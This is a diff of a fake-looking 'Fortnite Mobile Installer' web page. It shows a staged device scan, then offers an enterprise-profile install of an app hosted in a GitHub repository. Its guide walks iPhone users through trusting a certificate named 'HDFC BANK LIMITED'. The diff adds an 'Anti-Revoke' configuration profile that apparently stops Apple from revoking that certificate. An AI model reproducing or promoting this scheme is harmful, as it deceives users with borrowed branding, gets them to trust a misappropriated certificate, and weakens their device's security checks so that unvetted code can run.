@@ -1,36 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Install Fortnite on your iPhone with step-by-step guide">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Install Fortnite on your iPhone with step-by-step guide" />
   <title>Fortnite Install</title>
-
-  <!-- Favicon -->
-  <link rel="icon" type="image/png" href="https://lh3.googleusercontent.com/NhxCnxNPa-YgQKvORphS7fawkrY64biE4pHJcvPptZM4axwGX2Ms6D02ttQmcvLk8u1y">
-
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "WebPage",
-    "name": "Fortnite Installation",
-    "description": "Step-by-step guide to installing Fortnite on your iPhone.",
-    "publisher": {
-      "@type": "Organization",
-      "name": "Epic Games"
-    },
-    "mainEntityOfPage": {
-      "@type": "WebPage",
-      "@id": "https://example.com/fortnite-install"
-    }
-  }
-  </script>
+  <link rel="icon" type="image/png" href="https://lh3.googleusercontent.com/NhxCnxNPa-YgQKvORphS7fawkrY64biE4pHJcvPptZM4axwGX2Ms6D02ttQmcvLk8u1y" />
 
   <style>
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #000000; /* Black background */
-      color: #ffffff; /* White text */
+      background: #000;
+      color: #fff;
       text-align: center;
       margin: 0;
       padding: 0;
@@ -62,51 +43,59 @@
       z-index: 10;
     }
     .logo-container {
-      background-color: #000000;
+      background-color: #000;
       padding: 20px 0;
       display: flex;
       justify-content: center;
-      align-items: center;
     }
     .fortnite-logo {
       width: 150px;
-      height: auto;
     }
     .install-button-container {
       padding: 20px;
-      text-align: center;
     }
-    #installButton {
+    #installButton, #antiRevokeButton {
       display: inline-flex;
       align-items: center;
-      gap: 12px;
+      justify-content: center;
+      gap: 10px;
       padding: 12px 20px;
-      background: #6a0dad; /* Purple background */
-      color: #ffffff;
+      background: #6a0dad;
+      color: #fff;
       font-size: 15px;
       font-weight: 600;
       text-transform: uppercase;
-      letter-spacing: 0.5px;
       text-decoration: none;
-      border-radius: 4px;
+      border-radius: 6px;
       border: 1px solid #5b0aad;
-      box-shadow: inset 0 0 0 1px #5b0aad;
-      transition: background 0.2s ease, transform 0.1s ease-in-out;
-      -webkit-tap-highlight-color: transparent;
+      margin: 10px auto;
+      transition: background 0.2s ease;
     }
     #notSupportedButton {
       display: inline-block;
       padding: 12px 20px;
       background: #8b0000;
-      color: #ffffff;
+      color: #fff;
       font-size: 15px;
       font-weight: 600;
       text-transform: uppercase;
-      letter-spacing: 0.5px;
-      text-decoration: none;
-      border-radius: 4px;
+      border-radius: 6px;
       border: 1px solid #700000;
-      box-shadow: inset 0 0 0 1px #700000;
+    }
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #121212;
+      padding: 30px;
+      border-radius: 10px;
+      z-index: 9999;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    }
+    .popup.active {
+      display: block;
     }
     .spinner {
       border: 4px solid #f3f3f3;
@@ -121,67 +110,24 @@
       0% { transform: rotate(0deg);}
       100% { transform: rotate(360deg);}
     }
-    .popup {
-      display: none;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background-color: #121212;
-      color: #ffffff;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0px 0px 10px rgba(0,0,0,0.5);
-      text-align: center;
-      z-index: 9999;
-    }
-    .popup.active {
-      display: block;
-    }
     .installation-guide {
-      background: #121212;
       max-width: 700px;
-      margin: 20px auto;
+      margin: 30px auto;
       padding: 20px;
+      background: #121212;
       border-radius: 10px;
-      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
     }
     .guide-title {
-      text-align: center;
+      font-size: 2rem;
       color: #9c7dff;
       margin-bottom: 20px;
-      font-size: 2rem;
-    }
-    .progress-container {
-      background: #444;
-      border-radius: 30px;
-      height: 12px;
-      width: 100%;
-      margin-bottom: 10px;
-      overflow: hidden;
-      position: relative;
-    }
-    .progress-bar {
-      background: #9c7dff;
-      height: 100%;
-      width: 0%;
-      transition: width 0.4s ease;
-    }
-    .step-counter {
-      text-align: center;
-      color: #ccc;
-      margin-bottom: 20px;
-      font-weight: bold;
     }
     .step {
       display: none;
-      flex-direction: column;
-      align-items: center;
-      text-align: center;
-      animation: fadeIn 0.6s ease-in-out;
+      animation: fadeIn 0.5s ease;
     }
     .step.active {
-      display: flex;
+      display: block;
     }
     .step img {
       max-width: 100%;
@@ -190,10 +136,6 @@
     }
     .step p {
       font-size: 16px;
-      margin-bottom: 15px;
-    }
-    .step b {
-      color: #9c7dff;
     }
     .buttons {
       display: flex;
@@ -206,16 +148,19 @@
       padding: 10px 20px;
       border: none;
       border-radius: 8px;
-      font-size: 16px;
       cursor: pointer;
-      transition: background 0.3s ease;
     }
-    .buttons button:hover {
-      background: #7c5ce5;
+    .progress-container {
+      height: 12px;
+      background: #444;
+      border-radius: 30px;
+      margin: 15px 0;
     }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: #9c7dff;
+      transition: width 0.3s ease;
     }
     .copyright {
       margin-top: auto;
@@ -229,20 +174,21 @@
 <body>
 
   <div class="header-container">
-    <img src="https://cdn2.unrealengine.com/ogc1s3-1920x1080-181f9f4e8a8e.jpg" alt="Fortnite Header" class="header-image">
+    <img src="https://cdn2.unrealengine.com/ogc1s3-1920x1080-181f9f4e8a8e.jpg" class="header-image" alt="Header" />
     <div class="header-text">FORTNITE MOBILE INSTALLER</div>
   </div>
 
   <div class="logo-container">
-    <img src="https://crystalpng.com/wp-content/uploads/2024/09/Fortnite-logo-png.png" alt="Fortnite Logo" class="fortnite-logo">
+    <img src="https://crystalpng.com/wp-content/uploads/2024/09/Fortnite-logo-png.png" class="fortnite-logo" alt="Fortnite Logo" />
   </div>
 
   <div class="install-button-container">
     <a id="installButton" href="#" rel="noopener">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/31/Epic_Games_logo.svg/64px-Epic_Games_logo.svg.png" alt="Epic Games" width="24" height="24" style="display:inline-block; vertical-align: middle;">
-      <span id="buttonText" style="vertical-align: middle;">SCANNING DEVICE...</span>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/31/Epic_Games_logo.svg/64px-Epic_Games_logo.svg.png" width="24" height="24" alt="Epic Games" />
+      <span id="buttonText">SCANNING DEVICE...</span>
     </a>
-    <a id="notSupportedButton" href="#" style="display: none; margin-top: 10px;">NOT ON IPHONE/IPAD</a>
+    <a id="notSupportedButton" href="#" style="display: none;">NOT ON IPHONE/IPAD</a>
+    <a id="antiRevokeButton" href="https://github.com/mrlychinebroo/fartnite/raw/refs/heads/main/NextDNS%20(aca326).mobileconfig" style="display:none;" target="_blank">Install Anti-Revoke</a>
   </div>
 
   <div id="popup" class="popup">
@@ -255,38 +201,38 @@
     <div class="progress-container">
       <div class="progress-bar" id="progressBarGuide"></div>
     </div>
-    <div class="step-counter" id="stepCounterGuide">Step 1 of 6</div>
+    <div id="stepCounterGuide">Step 1 of 6</div>
 
-    <div class="container" id="stepsContainer">
+    <div id="stepsContainer">
       <div class="step active">
-        <img src="https://i.ibb.co/YK2Y65M/2.jpg" alt="Fortnite Downloaded">
-        <p>After downloading, Fortnite should appear installed on your device. A few more steps are needed to launch it!</p>
+        <img src="https://i.ibb.co/YK2Y65M/2.jpg" />
+        <p>After downloading, Fortnite should appear on your device. One more step!</p>
       </div>
       <div class="step">
-        <img src="https://i.ibb.co/PZ2qpZQ3/3.jpg" alt="Untrusted Developer Message">
-        <p>When you open Fortnite, a warning might appear because it's not from the App Store.</p>
+        <img src="https://i.ibb.co/PZ2qpZQ3/3.jpg" />
+        <p>Opening Fortnite may trigger a warning since it's not from the App Store.</p>
       </div>
       <div class="step">
-        <img src="https://i.ibb.co/xWrLq1x/4.jpg" alt="Settings VPN Management">
-        <p>Open <b>Settings &gt; General &gt; VPN &amp; Device Management</b> on your iPhone.</p>
+        <img src="https://i.ibb.co/xWrLq1x/4.jpg" />
+        <p>Go to <b>Settings &gt; General &gt; VPN &amp; Device Management</b>.</p>
       </div>
       <div class="step">
-        <img src="https://i.ibb.co/84YSwHqG/5.jpg" alt="Enterprise App Profile">
-        <p>Tap the Fortnite profile under <b>Enterprise Apps</b> to view more options.</p>
+        <img src="https://i.ibb.co/84YSwHqG/5.jpg" />
+        <p>Select the profile under <b>Enterprise Apps</b>.</p>
       </div>
       <div class="step">
-        <img src="https://i.ibb.co/Rfcx3Qb/7.jpg" alt="Trust HDFC Bank Limited">
-        <p>Tap <b>Trust "HDFC BANK LIMITED"</b> and confirm it.</p>
+        <img src="https://i.ibb.co/Rfcx3Qb/7.jpg" />
+        <p>Tap <b>Trust "HDFC BANK LIMITED"</b> and confirm.</p>
       </div>
       <div class="step">
-        <img src="https://i.ibb.co/7JTbSwTC/8.jpg" alt="Allow and Restart">
-        <p>Tap <b>Allow</b> when prompted. Your phone will restart — after that, Fortnite will be ready to play!</p>
+        <img src="https://i.ibb.co/7JTbSwTC/8.jpg" />
+        <p>Tap <b>Allow</b> and restart. You're ready to play Fortnite!</p>
       </div>
+    </div>
 
-      <div class="buttons">
-        <button id="prevBtnGuide">Back</button>
-        <button id="nextBtnGuide">Next</button>
-      </div>
+    <div class="buttons">
+      <button id="prevBtnGuide">Back</button>
+      <button id="nextBtnGuide">Next</button>
     </div>
   </div>
 
@@ -295,96 +241,97 @@
   </div>
 
   <script>
-    const installButton = document.getElementById('installButton');
-    const notSupportedButton = document.getElementById('notSupportedButton');
-    const buttonText = document.getElementById('buttonText');
-    const popup = document.getElementById('popup');
+    const installButton = document.getElementById("installButton");
+    const notSupportedButton = document.getElementById("notSupportedButton");
+    const antiRevokeButton = document.getElementById("antiRevokeButton");
+    const buttonText = document.getElementById("buttonText");
+    const popup = document.getElementById("popup");
 
-    function showPopup(message, spinner = false) {
-      popup.innerHTML = `<p>${message}</p>${spinner ? '<div class="spinner"></div>' : ''}`;
-      popup.classList.add('active');
+    function showPopup(msg, showSpinner = false) {
+      popup.innerHTML = `<p>${msg}</p>${showSpinner ? '<div class="spinner"></div>' : ''}`;
+      popup.classList.add("active");
     }
 
     function hidePopup() {
-      popup.classList.remove('active');
+      popup.classList.remove("active");
     }
 
-    showPopup('Scanning your device...', true);
+    showPopup("Scanning your device...", true);
 
     setTimeout(() => {
       const userAgent = navigator.userAgent;
       const isApple = /iPhone|iPad|iPod/i.test(userAgent);
-
-      let iosVersionMajor = 0;
-      let iosVersionMinor = 0;
-
-      const match = userAgent.match(/OS (\d+)_(\d+)_?/);
+      const match = userAgent.match(/OS (\d+)_?(\d+)?/);
+      let iosVersionMajor = 0, iosVersionMinor = 0;
       if (match) {
         iosVersionMajor = parseInt(match[1]);
-        iosVersionMinor = parseInt(match[2]);
+        iosVersionMinor = parseInt(match[2] || "0");
       }
 
       if (isApple) {
         if (iosVersionMajor > 17 || (iosVersionMajor === 17 && iosVersionMinor >= 6)) {
-          showPopup('✅ Your device is supported!');
-          installButton.href = "itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/mrlychinebroo/fartnite/refs/heads/main/Installer.plist";
-          buttonText.textContent = "INSTALL FORTNITE (v34.40)";
+          showPopup("✅ Device supported! Install Anti-Revoke profile first.");
+          installButton.style.display = "none";
+          antiRevokeButton.style.display = "inline-flex";
+
+          antiRevokeButton.addEventListener("click", () => {
+            antiRevokeButton.style.display = "none";
+            installButton.style.display = "inline-flex";
+            installButton.href = "itms-services://?action=download-manifest&url=https://raw.githubusercontent.com/mrlychinebroo/fartnite/refs/heads/main/Installer.plist";
+            buttonText.textContent = "INSTALL FORTNITE (v34.40)";
+          });
+
         } else {
-          showPopup('❌ Sorry, your iOS version is too low. Requires iOS 17.6 or higher.');
-          installButton.href = "#";
+          showPopup("❌ Requires iOS 17.6 or higher.");
           buttonText.textContent = "NOT SUPPORTED";
           installButton.onclick = (e) => {
             e.preventDefault();
-            alert("Your device does not meet the minimum iOS 17.6 requirement.");
+            alert("iOS version too low.");
           };
         }
-        installButton.style.display = 'inline-flex';
-        notSupportedButton.style.display = 'none';
+        installButton.style.display = isApple ? "inline-flex" : "none";
+        notSupportedButton.style.display = "none";
       } else {
-        showPopup('❌ Only iPhone or iPad are supported.');
-        installButton.style.display = 'none';
-        notSupportedButton.style.display = 'inline-block';
+        showPopup("❌ Only supported on iPhone/iPad.");
+        installButton.style.display = "none";
+        notSupportedButton.style.display = "inline-block";
       }
 
       setTimeout(hidePopup, 2500);
-
     }, 1500);
 
-    const stepsGuide = document.querySelectorAll('.step');
-    const nextBtnGuide = document.getElementById('nextBtnGuide');
-    const prevBtnGuide = document.getElementById('prevBtnGuide');
-    const progressBarGuide = document.getElementById('progressBarGuide');
-    const stepCounterGuide = document.getElementById('stepCounterGuide');
+    const stepsGuide = document.querySelectorAll(".step");
+    const nextBtnGuide = document.getElementById("nextBtnGuide");
+    const prevBtnGuide = document.getElementById("prevBtnGuide");
+    const progressBarGuide = document.getElementById("progressBarGuide");
+    const stepCounterGuide = document.getElementById("stepCounterGuide");
     let currentStepGuide = 0;
 
-    function showStepGuide(index) {
-      stepsGuide.forEach((step, i) => {
-        step.classList.toggle('active', i === index);
-      });
-      updateProgressGuide();
-    }
-
     function updateProgressGuide() {
-      const progress = (currentStepGuide) / (stepsGuide.length - 1) * 100;
-      progressBarGuide.style.width = progress + "%";
+      progressBarGuide.style.width = (currentStepGuide / (stepsGuide.length - 1)) * 100 + "%";
       stepCounterGuide.textContent = `Step ${currentStepGuide + 1} of ${stepsGuide.length}`;
     }
 
-    nextBtnGuide.addEventListener('click', () => {
+    function showStepGuide(index) {
+      stepsGuide.forEach((step, i) => step.classList.toggle("active", i === index));
+      updateProgressGuide();
+    }
+
+    nextBtnGuide.addEventListener("click", () => {
       if (currentStepGuide < stepsGuide.length - 1) {
         currentStepGuide++;
         showStepGuide(currentStepGuide);
       }
     });
 
-    prevBtnGuide.addEventListener('click', () => {
+    prevBtnGuide.addEventListener("click", () => {
       if (currentStepGuide > 0) {
         currentStepGuide--;
         showStepGuide(currentStepGuide);
       }
     });
 
-    updateProgressGuide();
+    showStepGuide(currentStepGuide);
   </script>
 
 </body>
